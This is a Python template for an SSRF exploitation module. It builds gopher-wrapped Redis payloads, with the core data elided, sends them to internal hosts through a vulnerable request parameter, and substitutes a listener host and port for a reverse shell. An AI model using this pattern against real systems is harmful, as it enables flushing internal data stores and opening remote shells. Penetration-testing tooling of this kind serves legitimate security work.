from core.utils import *
import logging

name          = "servicename in lowercase"
description   = "ServiceName RCE - What does it do"
author        = "Name or pseudo of the author"
documentation = ["http://link_to_a_research", "http://another_link"]

class exploit():
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = "4242"

    def __init__(self, requester, args):
        logging.info(f"Module '{name}' launched !")

        # Handle args for reverse shell
        self.SERVER_HOST = input("Server Host:") if args.lhost is None else args.lhost
        self.SERVER_PORT = input("Server Port:") if args.lport is None else args.lport
        # Using a generator to create the host list
        gen_host = gen_ip_list("127.0.0.1", args.level)
        # Data and port for the service
        port = "6379"
        data = "*1%0d%0a$8%0d%0aflus[...]%0aquit%0d%0a"
        for ip in gen_host:

            payload = wrapper_gopher(data, ip , port)

            # Handle args for reverse shell
            payload = payload.replace("SERVER_HOST", self.SERVER_HOST)
            payload = payload.replace("SERVER_PORT", self.SERVER_PORT)

            # Send the payload
            r = requester.do_request(args.param, payload)